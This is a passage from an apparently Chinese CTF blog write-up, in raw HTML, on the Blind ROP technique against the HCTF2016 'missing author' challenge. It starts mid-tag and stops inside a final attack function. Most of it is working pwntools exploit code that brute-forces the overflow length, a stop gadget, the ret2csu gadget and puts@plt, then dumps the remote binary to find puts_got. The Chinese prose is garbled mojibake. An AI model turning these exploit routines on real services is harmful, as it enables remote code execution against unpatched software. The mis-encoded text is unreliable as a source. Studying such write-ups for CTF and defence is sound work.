srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/><p>â€‹        0x4005efcå¤„æ˜¯pop rbp;</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819205030.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819205030.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/><p>â€‹        è¿˜æœ‰pop rsiå’Œpop rdiã€‚</p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819205209.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819205209.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/><p>â€‹        é€šè¿‡åç§»æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸å°‘gedgetã€‚</p><h2 id="0x01-BROP"><a href="#0x01-BROP" class="headerlink" title="0x01 . BROP"></a>0x01 . BROP</h2><h3 id="A-åŸç†-1"><a href="#A-åŸç†-1" class="headerlink" title="A . åŸç†"></a>A . åŸç†</h3><p>â€‹        è¿™ä¸ªæŠ€æœ¯æŒºğŸ‚ğŸºçš„ã€‚æ˜¯å‡ ä¸ªæ–¯å¦ç¦å¤§å­¦çš„å¸ˆå‚…åœ¨å…¬å…ƒ2014å¹´å‘è¡¨çš„<a href="http://www.scs.stanford.edu/brop/bittau-brop.pdf">è®ºæ–‡</a>ä¸­æå‡ºçš„ä¸€é¡¹ROPæŠ€æœ¯ï¼Œä¹Ÿæœ‰é€šä¿—çš„<a href="http://www.scs.stanford.edu/brop/bittau-brop-slides.pdf">ppt</a>ã€‚</p><p>â€‹        BROPå°±æ˜¯blink ropï¼Œæ˜¯æŒ‡æ²¡æœ‰æºç¨‹åºæºä»£ç çš„æƒ…å†µä¸‹(ä¸€èˆ¬æ˜¯åªå…è®¸è¿œç¨‹è¿æ¥)è¿›è¡Œropå¹¶ä¸”getshellã€‚æ–¹æ³•å°±æ˜¯é€šè¿‡æœ‰é™æ•°æ®å¯¹ç¨‹åºç»“æ„è¿›è¡Œåˆç†çŒœæµ‹ä»¥åŠè¿›è¡Œé€‚å½“çš„çˆ†ç ´ã€‚</p><p>â€‹        é€‚ç”¨æ¡ä»¶å¦‚ä¸‹ï¼š</p><ul><li>å­˜åœ¨æ ˆæº¢å‡º</li><li>è¿›ç¨‹å´©æºƒåè‡ªè¡Œé‡æ–°å¯åŠ¨ï¼Œå¹¶ä¸”é‡å¯åå„åœ°å€ä¸ä¹‹å‰è¿›ç¨‹åœ°å€ä¸€è‡´ã€‚</li></ul><p>â€‹        æ”»å‡»æ­¥éª¤å¦‚ä¸‹ï¼š</p><ul><li>ç¡®å®šæº¢å‡ºé•¿åº¦ã€‚</li><li>å¯»æ‰¾å¯è¡Œè¿”å›åœ°å€ã€‚</li><li>å¯»æ‰¾gadgetã€‚</li><li>ç¡®å®špltè¡¨ã€‚</li><li>ç¡®å®šgotè¡¨ã€‚</li><li>æ³„éœ²éƒ¨åˆ†ç¨‹åºäºŒè¿›åˆ¶æ•°æ®ã€‚</li><li>ç¡®å®šlibcå¹¶è¿›è¡Œæ”»å‡»ã€‚</li></ul><p>â€‹        ä»¥ä¸‹ç»“åˆ <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/brop/hctf2016-brop">HCTF2016 çš„å‡ºé¢˜äººå¤±è¸ªäº†</a>ä¸€é¢˜é€æ­¥è§£é‡Šï¼Œé€šè¿‡æœ¬åœ°dockerè¿›è¡Œè¿œç¨‹æ”»å‡»ã€‚</p><h4 id="1-ç¡®å®šæº¢å‡ºé•¿åº¦"><a href="#1-ç¡®å®šæº¢å‡ºé•¿åº¦" class="headerlink" title="1 . ç¡®å®šæº¢å‡ºé•¿åº¦"></a>1 . ç¡®å®šæº¢å‡ºé•¿åº¦</h4><p>â€‹        æˆ‘ä»¬éœ€è¦ç¡®å®šæº¢å‡ºç‚¹åˆ°è¿”å›åœ°å€çš„è·ç¦»ï¼Œé€šè¿‡çˆ†ç ´å¯ä»¥å®ç°ã€‚åœ¨ié€æ¸é€’å¢æ—¶ï¼Œå¦‚æœæŸä¸€ä¸ªiçš„å€¼ä½¿å¾—ç¨‹åºå‘ç”ŸEOFé”™è¯¯ï¼Œå°±è¯´æ˜æº¢å‡ºé•¿åº¦è¶…è¿‡äº†è¿”å›åœ°å€ï¼Œé‚£ä¹ˆi-1åˆ™å¯ä»¥è§†ä½œæº¢å‡ºé•¿åº¦ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_length</span>():</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10000</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span> * i)</span><br><span class="line">output = p.recv()</span><br><span class="line"><span class="built_in">print</span> output</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> output.startswith(<span class="string">&quot;No password&quot;</span>):</span><br><span class="line"><span class="keyword">return</span>  i-<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">i+=<span class="number">1</span></span><br><span class="line"><span class="keyword">except</span> EOFError:</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">return</span>  i-<span class="number">1</span></span><br><span class="line">length = <span class="number">72</span></span><br></pre></td></tr></table></figure><h4 id="2-å¯»æ‰¾å¯è¡Œè¿”å›åœ°å€"><a href="#2-å¯»æ‰¾å¯è¡Œè¿”å›åœ°å€" class="headerlink" title="2.å¯»æ‰¾å¯è¡Œè¿”å›åœ°å€"></a>2.å¯»æ‰¾å¯è¡Œè¿”å›åœ°å€</h4><p>â€‹        è¿™é‡Œè¯´çš„è¿”å›åœ°å€ï¼Œæ˜¯å¡«å……åœ¨ropé“¾æœ«ç«¯ä»¥ä¾¿æ§åˆ¶è¿”å›ç”¨çš„ã€‚å¤§æ¦‚æ˜¯ç±»ä¼¼main()å‡½æ•°ä¹‹ç±»çš„ä½ç½®ï¼Œç”¨æ¥æ§åˆ¶æµç¨‹ã€‚</p><p>â€‹        è¦å¯»æ‰¾å¯è¡Œè¿”å›åœ°å€(stop_addr)å¾ˆç®€å•ï¼Œåœ¨çŸ¥é“æº¢å‡ºé•¿åº¦çš„æƒ…å†µä¸‹ï¼Œåªè¦ä»0x400000å¼€å§‹çˆ†ç ´ï¼Œå¦‚æœæ‰¾åˆ°æŸä¸€ä¸ªaddrèƒ½æˆåŠŸè®©ç¨‹åºè¿”å›main()å‡½æ•°ï¼Œå°±è¯´æ˜è¿™ä¸ªåœ°å€å¯è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fine_stop</span>():</span></span><br><span class="line">addr = <span class="number">0x400556</span></span><br><span class="line"><span class="keyword">while</span> addr&lt;<span class="number">0xffffff</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10000</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span> * length + p64(addr))</span><br><span class="line">p.recv()</span><br><span class="line">p.close()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;===================&quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;This addr might work : %x&quot;</span>%addr</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;===================&quot;</span></span><br><span class="line">addr+=<span class="number">1</span></span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;%x--Nah&quot;</span>%addr</span><br><span class="line">addr+=<span class="number">1</span></span><br><span class="line">p.close()</span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br></pre></td></tr></table></figure><p>â€‹        è¿™æ ·æ‰¾å‡ºæ¥çš„åœ°å€å¯èƒ½æœ‰ä¸å°‘ï¼Œæˆ‘ä»¬æŒ‘ä¸€ä¸ªå°±è¡Œã€‚</p><p>â€‹        è¿™é‡Œæˆ‘ä»¬ä¸ºäº†æ–¹ä¾¿ï¼Œç›´æ¥è®©stop_addr = 0x4006B6ï¼Œä¹Ÿå°±æ˜¯main()å‡½æ•°çš„åœ°å€ã€‚</p><h4 id="3-å¯»æ‰¾gadget"><a href="#3-å¯»æ‰¾gadget" class="headerlink" title="3.å¯»æ‰¾gadget"></a>3.å¯»æ‰¾gadget</h4><p>â€‹        åˆå«stack readingï¼Œæ—¨åœ¨å¯»æ‰¾å¯è¡Œçš„pop_retè¯­å¥ï¼Œå®Œæˆå¯¹äºå¯„å­˜å™¨çš„ä¿®æ”¹ã€‚</p><p>â€‹        æˆ‘ä»¬çŸ¥é“ï¼Œæ ˆä¸Šçš„æ•°æ®å¸ƒå±€æ­£å¸¸æ¥è¯´æ˜¯è¿™æ ·çš„ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">padding|canary|parameters&#x2F;pop_ret|saved returned address</span><br></pre></td></tr></table></figure><p>â€‹        æ‰€ä»¥æ€»çš„æ¥è¯´ï¼Œèƒ½å¤Ÿä½¿ç¨‹åºé¡ºåˆ©æ‰§è¡Œçš„ropé“¾åŸºæœ¬ä¸Šæœ‰å¦‚ä¸‹2ç§ç»“æ„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + <span class="keyword">return</span> addr</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + canary + pop_ret + arg1 + ... ... + argn + <span class="keyword">return</span> addr</span><br></pre></td></tr></table></figure><p>â€‹        å¦‚æœæˆ‘ä»¬è¦æ‰¾pop_retè¯­å¥ï¼Œçˆ†ç ´ç¬¬äºŒä¸ªpayloadå³å¯ã€‚æ§åˆ¶argçš„æ•°é‡ä¸ºnä¸ªï¼Œå°±å¯ä»¥æ‰¾å‡ºpopå‡ºnä¸ªå¯„å­˜å™¨çš„è¯­å¥ã€‚è¯¥é¢˜ä¸­ï¼Œæˆ‘ä»¬æ‰¾ret2csuä¸­çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop rbx;</span><br><span class="line">pop rbp;</span><br><span class="line">pop r12;</span><br><span class="line">pop r13;</span><br><span class="line">pop r14;</span><br><span class="line">pop r15;</span><br><span class="line">ret;</span><br></pre></td></tr></table></figure><p>â€‹        åˆ™ä½¿ç”¨å¦‚ä¸‹payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + pop_ret + p64(<span class="number">0</span>) * <span class="number">6</span> + <span class="keyword">return</span> addr</span><br></pre></td></tr></table></figure><p>â€‹        å¦‚æœçˆ†ç ´å¾—åˆ°äº†ä¸€ä¸ªpop_reté¡ºåˆ©ä½¿å¾—ç¨‹åºè¿”å›åˆ°äº†main()å°±è¯´æ˜å®ƒæœ‰å¯èƒ½æ˜¯æˆ‘ä»¬è¦æ‰¾çš„åœ°å€ã€‚</p><p>â€‹        æˆ‘ä»¬è¿˜éœ€è¦æµ‹è¯•ï¼Œå¦‚æœä¸æŒ‰å¥—è·¯ç»™äºˆå¯„å­˜å™¨è¶³å¤Ÿçš„å€¼ï¼Œç¨‹åºä¼šä¸ä¼šå´©æºƒï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + pop_ret + p64(<span class="number">0</span>) * <span class="number">10</span></span><br></pre></td></tr></table></figure><p>â€‹        å¦‚æœç¨‹åºå´©æºƒï¼Œé‚£ä¹ˆè¯´æ˜pop_retç¡®å®æ˜¯æˆ‘ä»¬è¦æ‰¾çš„åœ°å€ï¼Œå› ä¸ºä¸Šè¿°payloadä½¿å…¶è¿”å›åˆ°äº†åœ°å€0x0000ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fine_csu</span>():</span></span><br><span class="line">addr = <span class="number">0x4007a0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;%x connecting...&quot;</span>%addr</span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10000</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * length<span class="comment">#now try the rop_chain</span></span><br><span class="line">payload+=p64(addr)<span class="comment">#ret of vuln_func(may be)</span></span><br><span class="line">payload+=p64(<span class="number">1</span>) + p64(<span class="number">2</span>) +p64(<span class="number">3</span>) + p64(<span class="number">4</span>) + p64(<span class="number">5</span>) +p64(<span class="number">6</span>)</span><br><span class="line">payload+=p64(stop_gadget)<span class="comment">#ret of pop_ret</span></span><br><span class="line">p.send(payload)</span><br><span class="line">output = p.recv()</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> output.startswith(<span class="string">&quot;WelCome&quot;</span>):<span class="comment">#which means we fault to return to the main() successfully</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;%x doesn&#x27;t working...&quot;</span>%addr</span><br><span class="line">addr+=<span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">try</span>:<span class="comment">#Here we need to test the addr</span></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10000</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * length</span><br><span class="line">payload+=p64(addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">10</span><span class="comment">#the given addr 0x00000000 would be unreachable for the process</span></span><br><span class="line">p.send(payload)</span><br><span class="line">output = p.recv()</span><br><span class="line">p.close()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Fake addr : %x&quot;</span>%addr<span class="comment">#The addr couldn&#x27;t be the pop_ret we need if the process exit successfully </span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">except</span> Exception:<span class="comment">#If the program crashes,we can be sure that we got the right gadget addr</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;We found!!! The addr is : %x&quot;</span>%addr</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">except</span> EOFError:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;%x caused a EOF error...&quot;</span>%addr</span><br><span class="line">p.close()</span><br><span class="line">addr+=<span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">csu_pop_ret = <span class="number">0x4007ba</span></span><br><span class="line">pop_rdi =  csu_pop_ret + <span class="number">9</span></span><br><span class="line">pop_rsi = csu_pop_ret +<span class="number">7</span></span><br></pre></td></tr></table></figure><h4 id="4-ç¡®å®špltè¡¨"><a href="#4-ç¡®å®špltè¡¨" class="headerlink" title="4 . ç¡®å®špltè¡¨"></a>4 . ç¡®å®špltè¡¨</h4><p>â€‹        ä¸€èˆ¬æ¥è¯´è¿™é‡Œæ‰¾çš„æ˜¯è¾“å‡ºå‡½æ•°çš„pltè¡¨ï¼Œä¾‹å¦‚writeå’Œputsã€‚</p><p>â€‹        å› ä¸ºæˆ‘ä»¬ä¸çŸ¥é“ç¨‹åºä¸­æœ‰å•¥æ•°æ®æœ‰å•¥å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨0x400000å½“ä½œè¾“å‡ºçš„åœ°å€ï¼ŒELFæ–‡ä»¶çš„å¼€å¤´æ˜¯â€\x7fELFâ€ï¼Œåªè¦çˆ†ç ´å‡ºæŸä¸ªåœ°å€èƒ½æˆåŠŸè¾“å‡ºâ€\x7fELFâ€ï¼Œæˆ‘ä»¬å°±èƒ½ç¡®å®šæ‰¾åˆ°äº†æ­£ç¡®çš„è¾“å‡ºå‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_puts_plt</span>():</span></span><br><span class="line">addr = <span class="number">0x400554</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10000</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * length</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(<span class="number">0x400000</span>)<span class="comment">#This addr is &quot;\x7fELF&quot;</span></span><br><span class="line">payload+=p64(addr)</span><br><span class="line">payload+=p64(stop_gadget)</span><br><span class="line">p.send(payload)</span><br><span class="line">output = p.recv()</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">if</span> output.startswith(<span class="string">&quot;\x7fELF&quot;</span>):</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;We got the puts_plt : %x&quot;</span>%addr</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;%x doesn&#x27;t make sence...&quot;</span>%addr</span><br><span class="line">addr += <span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;%x cause some error...&quot;</span>%addr</span><br><span class="line">addr += <span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">puts_plt = <span class="number">0x400560</span></span><br></pre></td></tr></table></figure><h4 id="5-æ³„éœ²éƒ¨åˆ†ç¨‹åºäºŒè¿›åˆ¶æ•°æ®ï¼Œç¡®å®šgotè¡¨"><a href="#5-æ³„éœ²éƒ¨åˆ†ç¨‹åºäºŒè¿›åˆ¶æ•°æ®ï¼Œç¡®å®šgotè¡¨" class="headerlink" title="5 . æ³„éœ²éƒ¨åˆ†ç¨‹åºäºŒè¿›åˆ¶æ•°æ®ï¼Œç¡®å®šgotè¡¨"></a>5 . æ³„éœ²éƒ¨åˆ†ç¨‹åºäºŒè¿›åˆ¶æ•°æ®ï¼Œç¡®å®šgotè¡¨</h4><p>â€‹        æ­¤æ—¶æˆ‘ä»¬æŒæ¡äº†puts_pltï¼Œå¯ä»¥å®ç°ä»»æ„è¯»ã€‚</p><p>â€‹        ä½†æ˜¯æˆ‘ä»¬çš„ç›®çš„æ˜¯æ‰¾åˆ°libcã€‚ä¼—æ‰€å‘¨çŸ¥pltè¡¨é¡¹æŒ‡å‘çš„æ˜¯gotè¡¨ï¼Œgotè¡¨åˆ™æŒ‡å‘libcçš„çœŸå®åœ°å€ã€‚</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819221436.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819221436.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>â€‹        æ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦æ‰¾åˆ°puts_gotã€‚</p><p>â€‹        é‚£ä¹ˆä¸ºäº†è·å–æ›´å¤šä¿¡æ¯ï¼Œæˆ‘ä»¬è¯»ä¸€æ®µELFä¸Šçš„æ•°æ®ï¼Œå¹¶ä¸”é€šè¿‡äºŒè¿›åˆ¶æ–¹å¼å†™å…¥åˆ°æ–°çš„æ–‡ä»¶ä¸­ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump_file</span>():</span></span><br><span class="line">fi = <span class="built_in">open</span>(<span class="string">&quot;code&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">addr = <span class="number">0x400000</span></span><br><span class="line"><span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;%x connecting ...&quot;</span>%addr</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * length + p64(pop_rdi) + p64(addr)+ p64(puts_plt)+ p64(stop_gadget)</span><br><span class="line">p.send(payload)</span><br><span class="line">data = p.recv()</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">data = data[:data.index(<span class="string">&quot;\nWelCome&quot;</span>)]</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">data = data</span><br><span class="line"><span class="keyword">if</span> data == <span class="string">&quot;&quot;</span>:</span><br><span class="line">data = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">result += data</span><br><span class="line">addr += <span class="built_in">len</span>(data)</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span> result</span><br><span class="line">fi.write(result)</span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br></pre></td></tr></table></figure><p>â€‹        é€šè¿‡ç¼–è¾‘-æ®µ-è®¾ç½®åŸºå€ï¼Œè®¾ç½®0x400000ä¸ºåŸºå€ï¼Œç„¶åæ‰¾åˆ°0x400560(ç¬¬4æ­¥ä¸­å¾—å‡ºçš„pltåœ°å€)ã€‚</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819220450.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819220450.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>â€‹        cé”®è½¬æ¢æˆä»£ç ã€‚</p><p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819220651.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819220651.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>â€‹        çœ‹åˆ°æ­¤å¤„ä»£ç è·³è½¬åˆ°äº†0x601018ï¼Œå› æ­¤è¿™ä¸ªå°±æ˜¯puts_gotã€‚</p><h4 id="6-ç¡®å®šlibcå¹¶è¿›è¡Œæ”»å‡»"><a href="#6-ç¡®å®šlibcå¹¶è¿›è¡Œæ”»å‡»" class="headerlink" title="6 . ç¡®å®šlibcå¹¶è¿›è¡Œæ”»å‡»"></a>6 . ç¡®å®šlibcå¹¶è¿›è¡Œæ”»å‡»</h4><p>â€‹        æ‰¾åˆ°äº†puts_gotä¹‹åï¼Œå†é€šè¿‡LibcSearcheræ‰¾åˆ°å¯¹åº”çš„libcç‰ˆæœ¬(å¯èƒ½æœ‰å¤šä¸ª)ï¼Œç„¶åå°±å†leakå‡ºsystemçš„åœ°å€å’Œbinå­—ç¬¦ä¸²çš„åœ°å€ï¼Œå³å¯å®Œæˆæ”»å‡»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>():</span></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">10000</span>)</span><br><span 